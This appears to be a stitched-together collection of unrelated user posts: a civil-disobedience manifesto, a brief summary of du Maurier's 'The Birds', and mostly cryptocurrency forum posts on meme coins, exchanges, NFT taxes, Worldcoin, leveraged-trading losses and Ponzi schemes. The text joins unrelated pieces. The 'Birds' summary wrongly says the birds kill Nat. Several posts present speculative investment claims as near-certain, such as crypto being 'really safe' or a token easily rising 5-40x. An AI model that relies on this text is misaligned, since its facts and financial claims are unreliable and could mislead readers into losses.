Throughout history, some of the most effective advancements of human rights came from peaceful disobedience against injustice. No law is valid which denies human rights. No dictate is valid which coerces acquiescense to risking severe bodily injury. Things like the draft, segregation, or even prohibition, are well understood as unjust.

We are seeing a phenomenon en masse, where people are becoming aware of the maliciousness of the ruling-class. Becoming aware of the attempted suppression of human rights in almost every domain: financial, digital, privacy, travel, and even communication freedoms. 

And now they're asking the question ... *What do we do? How do we change things?* And the answer is surprisingly simple. **Peaceful mass disobedience.**

The next question is usually something like: *How do we know when? I don't want to be alone, risking everything if we're few in number.* It's a valid question, a great quesiton; and the answer is also surprisingly simple. **It will happen organically.**

When the time comes, we will all know and act together in unison. But first we must prepare each other, mentally, physically, and spiritually. Spread this message to those who can hear it. Because make no mistake, such a time is coming. *We will* be required to stand together in disobedience against the unjust dictates of the ruling class. 

Once this truth is widely known, accepted, and the people are ready, things will happen organically. Your intution will be clear when the time arrives. It won't require a central leader or an election. It will be vastly more effective than any political process. And it will empower us to persue what is right, rather than what is expedient. 

So tell your family, friends, co-workers, acquaintances, tell those who can hear this message. Social media is nice, but it's better to converse in person. A shared understanding that we are going to be required to be brave, to do something. Because it's quite literally, our only way forward from here.

The Birds" is a short story by Daphne Du Maurier in which humble farmer Nat Hocken and his family are attacked by a flock of killer birds. Nat futilely attempts to board up his house against an attack. Eventually, the birds break in and kill Nat.

The Birds, one of Daphne du Mauriers most chilling short stories, is in the collection *The Apple Tree* . The shock lies in the idea of birds as destroyers.

What feeling Crypro bring in you since you stepped into it ?

- Is it being more positive and productive in life generally ? You see yourself ahead and be part of the early adopters of this crazy tech ?



- Hope ? Hope fora better future, being able to have a shot at financial freedom and perhaps afford dreams you never ever imagined before...



- Stress? Invested so much that if it fails you'll be in  deeper waters...


- Bitter? Invested long ago and you had a bad experience and now you just cannot stand it...


- Confused? You're still wondering if this thing is legit or a casino? A gamble as described by some...


How do you feel honestly about it?

Everyone hates on meme coins and what they represent which is most of the time pipe dreams and rug pulls. But honestly the memes are bringing people by the millions into the crypto space and has since skyrocketed our adoption and plastered crypto to the front page of most social media and news stations.

I myself stay away from hype coins but you gotta admit its accelerating mass adoption and brings tons of people here, while some may be looking for that next moonshot to get rich. A lot will stay and research other coins and invest their profits in long term projects. 

While meme coins may be bad in a sense their is also a bright side. The reach these hype coins have is putting crypto infront of millions of more users and growing the global Marketcap.

Curious to see how many came for the meme hype n quick gains, but decided  to stay around for the tech.

Some will get burnt, some will make money,
But all will learn about crypto.

First off, I'm new to cryptocurrency. If I have some fundamental misunderstanding to how things work feel free to let me know. I feel like what I want shouldn't be that hard to accomplish and yet there's no way for me to get it set up in a way that makes sense to me.

So I wanted to trade on a decentralized exchange like Uniswap or Loopring. but it seems that  I can't directly link a bank account to them. If I want to buy crypto I have to buy ETH through a client on Metamask. I then have to swap the ETH into the crypto that I want. This seems like an inefficient and unnecessary step. I feel like I should be able to link a bank account to one of these exchanges and simply buy the token that I want. If I need to pay ETH gas fees that's fine, but why should I pay a gas fee to buy ETH and a gas fee to swap ETH for the token I actually want? Can't I make one transaction to buy that token outright, only paying gas fees once?

So I was looking at using a centralized exchange instead. Not what I wanted to use, but I thought maybe it would work better. I went to Coinbase and set up an account, and I saw that I can link my bank account to the exchange and directly buy tokens. Problem is, I can't link up a non-custodial wallet like Metamask to the account. I'd have to set up a Coinbase wallet and swap back and forth between the two, which also seems completely unnecessary. So my question is:

Is there a decentralized exchange I can directly link both my bank account and a non-custodial wallet to, and does this exchange allow for buying/selling tokens directly?

Again, if there's something I'm not understanding about the process please let me know, but from where I'm sitting it seems like there's a lot of problems with crypto exchanges not being streamlined for usability. Thanks in advance.

Cheers.

So a long while back I sent letters to all my congress and senate. Only the Senator got back to me (Thom Tillis) and NO OTHER got back to me. I sent them all links to the [Token Taxonomy Act](https://www.congress.gov/bill/116th-congress/house-bill/2144/actions). Note with him at least I got a we will look at it or whatever, and maybe I could've pushed a little harder. But since the bill was in congress I'm not sure if anything a senator can do.

Now, a problem I pointed out in the past is starting to come up again. As I mentioned in the past where mainstream gaming companies are going to get into crypto and use NFT in interesting ways. Now we are having that seriously being looked at [https://hothardware.com/news/ubisoft-blockchain-cryptocurrency-games](https://hothardware.com/news/ubisoft-blockchain-cryptocurrency-games)

The problem is, taxes. You get say a NFT gun from the game by doing whatever in the game. If somehow it can be linked to a $ value. And this is to include you can buy x item with real money, sell that x item in game for in-game money, and then buy that NFT gun. Now you have a $ value. Once you earn it in the game, it is now income tax. And if you sell it even if it is in the game itself, then that is possible capital gains tax. In the past I used pokemon as an example because we all know about the trading system and what pokemon is. 

(Speaking of, the other week I was talking with a CPA and they mention when kids trade pokemon cards that is a taxable event since they are trading assets. It is just overlooked for the most part because they are kids and the value of going after them won't pay for the IRS going after them. But if you have a major game or many games, and they are focused on adults. Since the gov is trying to get every cent it can by tracking all movement of money. It isn't totally out of the question for this to start being a problem.)

&amp;#x200B;

This is what I'm about to send my senator. Note I might send it to my congress, but I know one of the reps has 0 care about helping and is a boomer that is a life long political person.

# Please feel free to copy, paste, edit, and send it to your representees. 

&gt;Hello, my name is   
  
&gt;  
&gt;A number of months ago I sent a message to your office about several problems within the USA tax system that harms the crypto industry, and how I would hope your office would support the Token Taxonomy Act. [https://www.congress.gov/bill/116th-congress/house-bill/2144/actions](https://www.congress.gov/bill/116th-congress/house-bill/2144/actions)  
&gt;  
&gt;  
&gt;  
&gt;The reason why I am mailing you today is because of a problem that is on the horizon that can severely harm the crypto industry in the USA and within this state. In short, a number of gaming companies are looking into using crypto with their games to help bring more features to their customers. [https://hothardware.com/news/ubisoft-blockchain-cryptocurrency-games](https://hothardware.com/news/ubisoft-blockchain-cryptocurrency-games) The problem comes in with how the current tax system is written.   
&gt;  
&gt;What some of the companies are working on is ways to transfer secure items (NFT) from one game to another, or from one player to another. This adding function within games which can grow with the player, but the security of it allows for the company to know a player can not cheat the system. There is a number of other functions that such technology does add, and please note the gaming industry isn't the only ones interested in using such technology.  
&gt;  
&gt;  
&gt;  
&gt;The current tax system could tax people an income tax when they receive the item being they earned it in a game or the company gave it to them during an event. Then when the player sells the in-game item (NFT) within the game itself or trade the item to other players, it could now cause a capital gains tax.   
&gt;  
&gt;So for example, lets say if you can buy some NFT with real money just like how in some games you can pay for some fancy sword or whatever. And lets say you can sell the sword in some way for in-game money. Now you have a general or exact $ amount towards how much everything in the game is worth. So with that in mind, if you are playing and lets say you come across an item during your play. The value of that item at the time you got is now taxable as income tax. Lets say the economy in the game is dynamic or maybe items change price depending on the area. When you sell an item in-game or trade it with another player in or outside of the game for the reason to be used in that or another game. The changed value is taxable as capital gains tax.   
&gt;  
&gt;More than less, this is the same as saying if I send a file to you and there is theoretical value to it. Then you should pay income tax, and when you trade that file or sell it even if it is in some game. Then you once again you're taxed but this time under capital gains tax.  
&gt;  
&gt;  
&gt;  
&gt;Note that I'm not saying the IRS will try to track down every last player so they have to pay real world taxes just for playing some random game. But with how the law is at this time, they could if they wanted to. And that single fact will always harm the overall industry in this country and this state.   
&gt;  
&gt;  
&gt;  
&gt;My suggestion is to remove crypto to crypto tax. This causes untold amount of damage across the industry. This single thing can and does cause problems in actual use cases like I mention above. On top of that, we are one of the extremely few developed countries in the world that taxes crypto to crypto swaps. Most countries only tax when the crypto is sold off for fiat or used to buy a good or service.  
&gt;  
&gt;Another thing that needs to happen is the rules around income tax around crypto needs to be far more clear. Currently, through staking or mining the creation of crypto is taxed as income tax. Many have given examples of this is similar to a baker being taxed on cupcakes he baked on the time of creation, and then taxed again when he sold them. [https://blockchain.bakermckenzie.com/2021/06/08/novel-lawsuit-brought-against-irs-concerning-tax-implications-of-staking/](https://blockchain.bakermckenzie.com/2021/06/08/novel-lawsuit-brought-against-irs-concerning-tax-implications-of-staking/) In this case we need that to be fixed because in many situations this will stop situations like I mention above from happening. But we also need something more which allows for the IRS to tax people for crypto they got as payment for doing a job, but not tax people for players simply playing a game.  
&gt;  
&gt;  
&gt;  
&gt;If you have any questions please feel free to get back to me. You can contact me at the following.  
&gt;  
&gt;Email:  
&gt;  
&gt;Phone: 

What should I change? 

NOTE: I'm not expecting anything to change. But I know if I do this then I can at least say I did everything within my power. 

Side note: the links can't be placed inside anything. Their contact page doesn't allow that.

I'll say, I haven't been in the crypto game for too long. Maybe 6 months. I put 100 into staking ETH2 and forgot about it, until I heard about shib, and oh, it was sweet sweet sounds. I put $500 into it, and I've made over $6,800 and then rolled out. I had done no due diligence prior, nor did I know the reasons it would go up. I just bought the rumor and It paid off. But.... I'm one of the lucky ones. Once too much hype comes to a meme coin, it becomes an illogical cult funded by hopium. The Shibarmy is no more. Only future bag holders in my opinion. Maybe I'm wrong though. I've been a pessimist my entire life believing "if it's too good to be true, then it is." I'd like your thoughts on this, if I may ask. 


Thoughts on my reinvestment. 

I took my profits and put

$2,600 into BTC

$1,800 into ETH2 (stake) 

$800 into each Cardano, Solana, and polkadot 

With around $100 left to fomo into MANA


I'd appreciate your thoughts. Thanks for the read.

Looprings zkrollup and recent patent is taking aim for more than the NFT market. Faster, cheaper and easier access has been a goal for a long time with Etherium. The development is setting the stage for other applications to be established and used across other platforms. Im stoked. In my opinion the recent Wild West with crypto is seeing a link similarly to the west coast to east coast railways. Communities growing, and establishing new territory will only help this market arena setting the stage for years of remarkable growth. The old man club of finance will be challenged, as they decide to adopt, follow or just be blown away like a tumble weed. Regulations will come and fear and uncertainty will be the driving force behind losing their old ways. However crypto is here to stay no matter how many old men say its useless, a fad, blah blah blah. Let them fade away and drift off in the sandstorm of change. Excited to see how LRC, and the many other currencies linked to groundbreaking projects connect and invest in our future! just my opinion.

First: let me say. I am just throwing out things Ive read about: I dont have holdings in some of these.

And these are my two bit layman reads of what these coins do - take with a grain of salt.

Ocean protocol: share private data securely for money: help power open AI endeavors.

Nano: the one I think will take over, feeless, near instant payment thats eco-friendly (no mining, and minimal power consumption)

Curecoin: a coin based on solving folding.at.home protein simulation calculations; help brute force new medicines - this seems like a real world benefit for everyone, to help incentivize these expensive calculations - the result though could be things like anti-aging, and curing cancer... or any number of diseases.

Those are my three main eyebrow raisers.

Anyone else find crypto that solves a unique problem? or a superior general money use case (Nano I think wins hands down in that regard)?

News broke today that US officials want stable-coins to be regulated like banks. While that may seem like bad news it may give crypto the push it needs to go mainstream. 

For one it helps stabilize stablecoins from runs if/when the market turns sour. It would support transparency of their reserves. And it might result in an industry insurance program like the FDIC. 

Thats all good news for traders who will have more security as a result. 

It also means relatively little for stable coin companies. Sure, their lawyers will be busy, and theyll have to implement reporting requirements. They may also need to readjust their holdings (especially Tether). 

For certain there will be a lot of back and forth in the coming months, but net-net its a positive.

Looking for lower cost nodes or any type of passive crypto income. Made some lucky money in 2017 but cashed out and never came back. I've heard about $strong yeildnode and hyperfund but at this point I'm lost. Any good reading material would be awesome and even a few good shills. Really looking to do as much learning while still being an active part in the community. I'm into NFTs and my wife is an artist and she is really into the idea of crypto and wants me to really push for it for our future. Help a noob out! Lol

Option B - 12,630

So option B has taken a pretty strong lead with nearly 7,000 less wallets voting for it. Looks like the whales will be dictating in which direction this, and potentially all the future votes, will go.

What are your thoughts on this? Is there a more fair way of this? Or should those with bigger bags get a bigger say in the vote?

I have ADA on yoroi and I want to send it to coinbase pro. Everytime I try to do it and fill in everything. I keep getting the message: decryption error. Do any of you guys know why?

I tried asking this on r/cardano but they dont allow questions about yoroi wallet and said I should ask on r/yoroi but there are only scammers there that are in my DM's. 

I dont know why I keep getting the same error. What am I doing wrong. Is it coinbase pro or yoroi or something else. 

Yesterday I did take my ADA out of a staking pool with my rewards, maybe that has anything to do with this? 

Any advice appreciated.

Crypto is actually really safe. Just think about most top coins. If you would buy more than year ago then on most of them, especially in BTC or ETH you would have profits.

Crypto is painted as dangerous, full of scams and rugpulls, but we forgot that probably 90% of them  happened because someome was too naive and  too greedy. World is full of idiots that will believe in every bullshit. People invest in terrible coins, because they count on becoming milionaires overnight. I am not gonna lie I am also here for money, but I know money do not grow on trees. You need to be greedy in crypto, there is a lot of time for it. Be greedy during bear market, when dips happen, when others are fearful. It is good greed. But don't be greedy when every thing pump, be fearful then and count your profits. And no, you will not make millions $ when price already grow. You are too late. Later you are, less profits you earn. You become more jealous and greedy. Scammers want exactly this. You become victims of your own greed. Instead of learning more you try to find easiest way. I tell you if that way would exist most of us would be already on tropical islands.


You could invest in BTC, ADA, ETH, ALGO, VET or Harmony. You would make nice profits in next 3/5 years. Maybe your portfolio would grow x3 maybe x5. You could learn more about investing and even have x20 or x100 profits in some coins in long term. It is not impossible. But lets be real. Most people want to do  x10000 or even more on their coins. They count on things that depend only on luck. They want to turn 1$ into 1 million. And it is dumb.  They gamble money cause they wanted to catch dreams made of mist.

Most people that FOMO into obvious scams knew what they did or at least should knew if they are really adults and not 8 years old kids. If everyone told you something is a scam and you still put money in you deserve to lose those money. It is probably only thing that can help you become more responsible. If not it is only matter of time you will lose money again. At this point I can't treat it any other way than natural selection. People too greedy lose money. They even give bad name for real scam and rugpulls victims that often made no mistakes.


I am really sorry for people that were really innocent victims. But all greedy beginners can blame only themselves. You don't need even to be crypto investor to undertand basic scams.

People on here love beating themselves up over each historic milestone:

If only I brought BTC when it was $1

If only I brought ETH last year when it was \~$300

If only I brought DoGe.....

If only I SHIB blh blah blah....

So many millionaires on this sub if it wasn't for the 'if only's but to be honest, even if most of you did buy in at those prices you NEVER would have HODL to the prices they became and that's not strictly wrong of you but if you can't take the higher risk factor then you will never reach the higher gains which again is not completely wrong, I personally prefer a more moderate risk factor in my investments.

So with Loopring sitting around $1 and with a market cap only around the single billion it is a coin with sooooooo much potential growth, could easily be between 5-40x depending on time and the market assessment. So this may very well be that next chance to break the 'if only' circle.

....Then again it might rug pull us and make us all broke, that's where the high risk part of high risk comes into play. Just don't be complaining if it doesn't crash next year that you 'never had the chance' because it, and many other chances, are right here waiting for you.

I got wrecked lat night, I dont recommend this for anyone but, I need to make my 10k back so whats the best way lol

how do they know where to rank the price to?

Is there better data I can look at?

I know what I did wrong, like all 7 things but not sure I wont just make the same mistakes.  Trading psychology is no joke 

Too large of a position ( started small and increased as price dropped.

Impulsive rebuys

Hypnotized by the 1 min chart

Too much leverage (60x)

Didnt cut for a small loss

Stayed in the play way too long 

Cant remember #7 at the moment

There are three kinds of actors in Bitcoin:

* The **Fool** bases his decisions upon out-of-date information from the **previous cycle**. He is skeptical even during a bull run because he does not understand that the value of his Bitcoin improved dramatically after the last Halvening.
* The **Trader** bases his decisions upon current information from the **current cycle**. He is confident during a bull run, but he is skeptical during a bear run because he doesn't understand that the value of his Bitcoin will improve dramatically with the coming of the next Halvening.
* The **Wise** bases his decisions upon information from the **next cycle**. He is confident even during a bear run because he understands that the value of his Bitcoin will increase dramatically when the next Halvening hits.

The real source of the supply shock we are about to see is the Halvening. However, we have not felt the effects of it until recently because there has been a ready supply of Fools selling their coins at out-of-date prices. But these Fools are running out of coins soon and will no longer be able to sandbag the price. 

And for the first time this cycle... the market is about to feel how much harder Bitcoin has become to get.

Friends,

This   is not a typical post. This is a call to action for the entire crypto   community to come together to denounce and unequivocally reject what I   feel is one of the greatest injustices and evils to emerge in the   history of cryptocurrency.

Some of you may be aware of an announcement one week ago that was made by [Sam Altman introducing Worldcoin](https://twitter.com/sama/status/1451203161029427208), a digital coin that is given free of charge to everyone and in which you must scan and your eye in order to take part in it.

Upon   delving deeper into the details of this "currency" and it's true   motivations, I have been struck with disgust at how Orwellian this   project truly is and how it breaches every level of ethics and human   rights we should collectively hold as a community.

**Worldcoin   is far more than your typical crypto scam, it is a data harvesting  tech  company backed by Silicon Valley billionaires that is masquerading  as  one.** It aims to take advantage of the most desperate in society in order to extract data from them in the promise of potential *"free money"*.   This is not a conspiracy theory, this is happening right now. 160k+   people have been signed up so far with hundreds of millions more   targeted by 2022.

My faith in this   community is what led me to write this article; in the belief that   together we can exert enough pressure to stop Worldcoin. I may be   optimistic, but I believe that this is a major inflection point for the   crypto community to collectively decide where our ethics and values   stand.

Please read this article   (it is not behind a paywall) in full to understand why this project is   evil and must be stopped. Furthermore, please share this article to as   many people as possible across the internet and the entire crypto   community in order to get the message out.

**Link to the Article:** [**https://medium.com/@fyodorwittgenstein/worldcoin-is-evil-c0980ad148cd**](https://medium.com/@fyodorwittgenstein/worldcoin-is-evil-c0980ad148cd)

Maybe I'll get a lot of negative comments, but that's ok.

I just feel a bit lost sometimes when I look through the posts and comments on here and other crypto subreddits.

Satoshi wanted to give a big middle finger to the existing financial system...not be absorbed by it.

Genesis block:

"

**The Times 03/Jan/2009 Chancellor on brink of second bailout for banks**

*Satoshi Nakamoto*

"

The bailouts ruined countless lives, both short and long term, ranging from hardworking everyday people's retirement funds to investors to everyone inbetween.

The banks robbed us blind.

But now we have people excited about ETFs. People crave the old ways instead of embarking wholeheartedly to the new.

Some people beg for regulations when they see shitcoins and other unfortunate circumstances.

Are you kidding me? Give this **centralized** power to the same thieves that use their power to steal from the masses? Hard pass.

Yes it sucks when people get burned, but hey sometimes that's how you learn.

You want full and total control over your money, you need to take full and total responsibility over your choices. Hard fact.

Everyone regurgitating talking points about how exciting it is institutional finance is getting involved with crypto and how they'll better manage it is just feeding into the corrupt system. Please wake up and smell the roses before it's too late.

Maybe I'm alone here, I don't know.

But if this sounds cool to you [https://en.wikipedia.org/wiki/Cypherpunk](https://en.wikipedia.org/wiki/Cypherpunk) then join me down the rabbit hole.

Thank you and have a nice day.

This June, when the market was down in the dumps, I turned 30. I decided to gift myself $250 worth of any crypto I wanted instead of going out and blowing that kinda cash on something stupid that I wouldnt use or want within the next year or two. 
I bough some DOT and let it sit, and stake. Now, with all the weekly rewards and DOT hitting the high 40s, Ive nearly tripled my initial investment. 

Do yourself a favor and every once in a while give yourself a small gift of crypto. DCA and HODL and what couldve been me getting some new AirPods for my birthday is now a nice stack of coins getting bigger each week with staking. 

Gonna do the same thing this week with my new baby niece. 
Cheers and happy Monday everyone!

Hello, I am looking for any advice on my situation. 

TL;DR - my parents are pushing me to get a job, I would much rather make money myself. Looking for any advice on how I can make enough money to atleast match what a beginner job would make. ($2000/month) 

Currently I am 20 years old. The past 2 and a half years I've been out of school and I haven't completed anything. I never had a job, and I do not have any sort of income. 

I live with my parents, and all I've done with my time is play video games, watch YouTube, scroll Reddit, etc. 

I always been entrepreneur/business oriented, I genuinely cannot fathom trading my time and energy for money doing something I don't enjoy, taking orders from someone else, and making them rich. 

Everyone around me gives me the generic advice "get a good job, work hard, you need to start somewhere!" 

...and I don't agree with this way of thinking. 

I've spent too much time doing absolutely nothing productive. My parents are really pushing for me to get a job now and I need to do something very soon. 

My dad lined me up with a job, and everyone around me seems to think it's a great opportunity, and I do not. 

It's a basic $14-15/hour labor job, I would be working full time doing something I do not enjoy. 

This is probably the "best" job I could get around here with zero experience, and that's where their view comes from, but I see so much better opportunity with online businesses, investing, etc. 

I cannot simply explain my opinion to them since their response will be "you need to start somewhere, and build up some money." I have more than enough money to start an online business. 

I basically need to make a decision today. Do I just take a crappy job, and work on an online business/investing with the small free time/energy I'll have left, or how would it be possible I can steadily generate enough income to atleast match what a starter job would net me. 

I know of multiple ways I plan on generating income, I just don't know of how I can make money myself quick, and steadily. 

Some ideas I have had: 
-eBay selling old belongings/reselling
-Investing in stocks/crypto/NFTs, etc. 
-Day trading
-YouTube channel

List goes on. Most of which will take months to get the ball rolling. I'm looking for ideas for right now. 

Thank you.

**Goal of this Post**

Talk about my journey into crypto, and explain to other crypto newbs who are only using big exchanges how to save fees and invest in smaller market coins that have not yet hit those exchanges. This isn't financial advice, it's more just how as a US citizen can you get access to coins that aren't on Coinbase. I also hope to get feedback on what I am still doing wrong, since I am still very much a newbie. Also hopefully some people will just enjoy reading about it.

**Backstory (skip to Lessons Learned for TLDR)**

I'm someone who was holding 0.5 ETH in since 2017 in a Coinbase account that I never checked. I'm a software engineer who had initially dismissed crypto as too complicated to become mainstream. In the last few weeks though I decided I wanted to deep dive into crypto, better understand blockchain technology, and in particular try to figure out if Play-To-Earn is really the future of videogames or not.

I started off by first trying to understand how Bitcoin and Ethereum work, and what Ethereum's transition to Proof of Stake means, and what a smart contract is. I'd recommend running through a free course or two online as a way to jump in. I used [this Coursera course](https://www.coursera.org/learn/crypto-finance) to start off. There are a ton of other options though, so pick one! Learning more about Ethereum made me really bullish on Ethereum, so I bought some the only way I knew how -- using Coinbase. I already had it hooked up to my bank account, so it was easy.

Then I joined this subreddit, and quickly got hooked. I want some ONE, and TRAC, and ALGO. I want to throw a little bit into some memecoins like ELON. But wait, some of these aren't on Coinbase, what do I do? First I started using Coinbase Pro, then I figured out using KuCoin, and then finally made a MetaMask wallet and figured out using exchanges like Uniswap and Pancakeswap. I wanted to summarize my findings here for other newbies who are stuck on Coinbase and typically just wait for Coinbase to support a coin before investing in it.

**Lessons Learned**

1. **Coinbase Sucks**. It's really great as a newb-friendly platform for people who are just getting started in crypto investing, but the fees are really high, and in some cases hidden. For example, when you transfer between crypto types, it shows you that the fee is $0, but you are getting a poor exchange rate and as soon as the transfer is complete you'll notice the full $ amount is not reflected after the change.
2. **Coinbase Pro is Better**. It's interoperable with Coinbase, and has way lower fees. It supports limit transactions for more advanced trading, has more coin options available, and the only downside is that the user interface is worse and more confusing.
3. **Transfer to other exchanges using XLM (Stellar)**. XLM is incredibly fast and has near-zero fees. If you need to get your assets out of Coinbase and into another exchange, first convert them to XLM, then you can transfer to another exchange like **KuCoin** or **Binance.**
4. **ETH Gas Fees are Insane, use BSC (Binance Smart Chain) if you can instead.** For many small market coins, they are either available only through BSC or they are available on both ETH and BSC. Transfer to BSC using XLM, trade your XLM for BNB, and buy your small bags of small market coins using BNB.
5. **Play-to-Earn Does Not Mean Fun.** Many play to earn games, especially those on the WAX platform, are hardly games at all (looking at you Alien Worlds). They're just idle clickers in some fashion with massive upfront investment costs (looking at you Farmer's World!). A lot of the P2E space feels like cash grabs for limited edition NFTs that entirely rely on hype and FOMO to sell. There are a few real games (Axie Infinity, God's Unchained) in the space, and these have a ton of potential in my opinion. But all in all it seems like a lot of gaming companies in the P2E space are just overhyping NFTs for games that are either not released or still in very early beta, and reaping tons of profits from these "limited edition" NFTs. The FOMO is real, and the FOMO is never ending, as there will be a never ending stream of "limited edition" NFTs now.
6. **Look up Staking for your coins**. For instance, don't hold your ADA in Coinbase. Get an ADA wallet, and stake it!
7. **HODL!** Especially ETH and BTC!

**Helpful How-Tos for Coinbase Users:**

* **Buying on KuCoin** (e.g. I want to buy some **ONE**!)

1. Get some XLM on Coinbase.
2. Transfer XLM to KuCoin (use Deposit button in KuCoin to get your XLM address and memo)
3. Sell XLM for USDT on KuCoin.
4. Buy ONE/USDT (or your other crypto of choice that's on KuCoin but not Coinbase) on KuCoin.

* **Buying on Uniswap** (e.g. FLOKI) -- **this will have expensive gas fees!**

1. Get some ETH on Coinbase.
2. Create a MetaMask wallet ([https://metamask.io/](https://metamask.io/)) -- make sure you never share your recovery phrase with anyone ever. I like the Chrome plugin.
3. Transfer your ETH to your Metamask wallet address. Prepare yourself to get owned by ETH gas fees. Try to pick a time of day when they are lower (google for this)
4. Now you can use Uniswap by connecting your Metamask wallet. Note -- no website will ever ask you for your recovery phrase, ever.

* **Buying on PancakeSwap using BSC** (e.g. CATGIRL)

1. Get some XLM on Coinbase
2. Open a Binance (or [Binance.us](https://Binance.us) if you are in the US) account. You don't have to finish the identity verification process (my step #3 is still pending for almost 2 weeks now)
3. Transfer the XLM to Binance
4. Sell the XLM for USDT on Binance
5. Buy BNB on Binance
6. Open a Binance Chain wallet
7. Transfer the BNB to your Binance Chain wallet using the Binance Chain Network (note: this transfer and subsequent transfers here will have fees, but they are very tiny compared to ETH gas fees)
8. Transfer your BNB balance to the Binance Smart Chain using the Binance Chain wallet
9. Create a MetaMask wallet if you don't already have one
10. Add Binance Smart Chain to your MetaMask wallet (see [Connecting BSC to MetaMask](https://academy.binance.com/en/articles/connecting-metamask-to-binance-smart-chain))
11. Transfer your BNB balance to your MetaMask wallet.
12. Now you can use PancakeSwap and transfer BNB for whatever BSC small market coin you want to nab (CATGIRL! Or maybe you want to play DogeDash)

I want to start off by saying I'm a tiny investor. I don't have much money to throw around, and my portfolio is almost always under $1000. I just do it for fun, and maybe I'll get some extra food money along the way.

This has happened a few times.

I had doge back in January and sold it to put into GME as it went up. I made a little off of GME, but not even close to how much I would've made with doge. I've been holding 2 shares in GME since. But I'm pretty short on cash now, so I sold a share a few days ago. And it's gone up  ~50 already.

I also had some shiba inu coin and sold it all when it was about 26, and a few days later it goes up to 80(?).

These weren't educated sells. More like my money situation isn't ideal, and I need some cushion. But I'd have a lot more cushion If I waited just a little longer :/

I remember when I first got into crypto, it was from a link a friend sent me for a project called "Pi Network".

You basically got free Pi from checking your phone daily and inviting people. I remember reading up about it and apparently they were supposed to hit Mainnet this year. 

I ended up deleting it after I learned how to actually get on exchanges, and buy real coins. Pi's Reddit is filled with people saying its legit, but I've never heard of it anywhere else.

So does anyone know if it was just a data stealing operation , or is it a legit product that will be launched eventually?

I hear a lot of talk about Ponzi Schemes getting thrown around here, so I would like to give my perspective on a few aspects of what makes Ponzi schemes similar, but ultimately different than rug pull meme coins. 

Let's start with the legal definition of a Ponzi Scheme as [provided by Cornell University Law School](https://www.law.cornell.edu/wex/ponzi_scheme): 

" A type of investment fraud in which investors are promised artificially high rates of return **with little or no risk**; original investors and the perpetrators of the fraud are paid off by funds from later investors, but there is little or no actual business activity that produces revenue. The scheme generates funds for previous investors so long as there is a consistent flow of funds from new investors. This gives the impression that the earlier investments drastically increased in value in a short period of time. The scheme inevitably collapses when too many investors demand redemption or when the scheme fails to attract a sufficient number of new investments. The Ponzi scheme is named after Charles Ponzi, who in the 1920 defrauded thousands of investors in Boston."

My main argument for why all Cryptos are not Ponzi schemes centers on the idea of **"with little or no risk"**. Crypto, by and large, is considered among the riskiest investments anyone can make, unlike Hedge funds run by Bernie Madoff promising 12% annual returns, for example. Therefore, whether the ~~investor~~ gambler acknowledges the presence of the risk in meme coins, there is still inherent risk, and this information is typically presented to investors in the form of white papers, road maps, and even the r/cryptocurrency community itself (crypto is a decentralized market after all, so this community's opinion should hold some weight, but of course DYOR). This risk is especially true for meme coins like DOGE, SHIB, FLOKI, and of course SQUID. 

Then we can look at the aspect of "little or no actual business activity that produces revenue". Most coins and tokens do not have any value tied to it other than what speculators place within it, even the one coin to rule them all (BTC) has plenty of speculation with no actual "business activity". There are certainly innovations that are exciting (PoW for example), which allows "smart money" to speculate about future value and use cases, but for the most part cryptos are speculative with little or no business activity/revenue involved. We can argue all day long about whether or not there is enough "business activity" to justify the mass speculation that we place upon all cryptocurrencies, but in my opinion speculation over future potential is natural in ALL markets including stocks and crypto. Therefore, it is unfair to call SQUID, DOGE, FLOKI, and SHIB Ponzi Schemes but not GME or AMC, which I don't think they are Ponzi Schemes either (after all those two companies are purely speculation ~~plays~~ gambles that in all reality generate a small amount of revenue and business activity relative to their valuation).

This brings me to the next sentence "The scheme generates funds for previous investors so long as there is a consistent flow of funds from new investors". Again, this is true for ALL markets. If everyone decided to pick an S&amp;P 500 company to stop investing in, the stock price would collapse and those left holding the bag would feel cheated out of what they thought were guaranteed gains. Let's make one up with a stupid name, I'll go with *Meta* for example. Now say they have a real jerk-off CEO named Mark Duckerberg and he gets thrown in jail by the FBI and/or CIA for leaking confidential data, then that company will go through panic selling that will cause the ~~company~~ scheme to "inevitably collapse when too many investors demand redemption or when the scheme fails to attract a sufficient number of new investments". Therefore, this idea of a "rug pull" is also not unique to the crypto market and assets backed by pure speculation, so in itself cannot be considered a definition for a Ponzi Scheme.

Now to compare what Bernie Madoff did so we can hopefully understand what makes a REAL Ponzi scheme. I made up my own numbers to make it easier for people to understand. I find 3 ~~friends~~ suckers and GUARANTEE them that I can get them each 50% returns if they give me $10. When the third sucker agrees, I have $30. I go back to sucker #1 and tell them, "hey your $10 is now $15". That sucker can do one of two things, both of which I am ok with, they can either say "I will take my $15 " or they will say "Let it ride, you are doing great" (this is the more likely option because people are greedy and don't ask too many questions when things seem to be going right). Now, if I give them the $15 they will go tell their friends about the great return they got from my 'investment company' and a whole bunch of new suckers might join. Before the new suckers join, I am at $15 dollars, so I can tell sucker #2 "hey your $10 is now $15", they might ask for the money or let it ride. Either way, at this point both sucker #1 and sucker #2 are most likely ~~telling~~  bragging to everyone they know that they just made a 50% return in a week with this GENIUS ~~investor~~ con artist named TonyGabaghoul. All of their ~~friends~~ suckers likely start pouring in with $10 investments or maybe more if they are greedy enough (FOMO BABY!!). Now that I have a new inflow of ~~investors~~ suckers I can cover sucker #3 when I tell them that their $10 became $15. The ONLY way I get caught is if sucker #3 hears from either #1 or #2 that they can also sell out and get a 50% return before I get new ~~investors~~ suckers to give me more money. In this scheme, I am implying no risk and insane returns that beat the rest of the market, while not actually investing in a single asset. The only thing that the ~~investor~~ sucker has is my word that their assets are appreciating.

This differs than SQUID, DOGE, FLOKI, and SHIB because there are actual assets (no matter how useless) that you can see you own on the blockchain. It sucks that you couldn't sell it in the case of SQUID, but that was IN THE WHITEPAPER and getting posted about non-stop on r/cryptocurrency for the two days leading up to the rug pull. It also sucks to buy the top like happened to many with DOGE and SHIB, but that can happen in a housing market, stock market, or even with BTC/ETH. Again, rug-pulls are not in themselves Ponzi Schemes because there is still a KNOWN risk involved in the market as opposed to a GUARANTEED return like a Ponzi Scheme.

I am sure many will disagree with me about what makes a Ponzi Scheme, but to me the statement about "**little or no risk**" is what separates true Ponzi Schemes from speculative market gambles like meme coin cryptocurrencies.

Thank you for reading and I will feast off of your downvotes now.

